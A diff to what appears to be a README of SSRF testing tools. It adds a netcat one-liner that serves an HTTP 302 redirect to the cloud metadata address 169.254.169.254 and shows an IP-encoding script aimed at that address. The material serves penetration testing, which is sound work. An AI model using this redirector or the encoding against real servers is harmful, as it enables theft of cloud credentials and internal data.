@@ -60,6 +60,12 @@ xml 301 response without and with a valid response body:
 
 ***
 
+### Minimal web server using netcat
+
+`while true ; do nc -l -p 80 -c 'echo -e "HTTP/1.1 302 Found\n \nContent-Type:application/json \nLocation:http://169.254.169.254/\n\n {\"a\":\"b\"}"'; done`
+
+***
+
 ### ip.py - Alternate IP encoding tool useful for SSRF Testing
 
 python ip.py IP EXPORT(optional)
@@ -67,7 +73,6 @@ python ip.py IP EXPORT(optional)
 python ip.py 169.254.169.254
 
 python ip.py 169.254.169.254 export
-
 
 ***
 
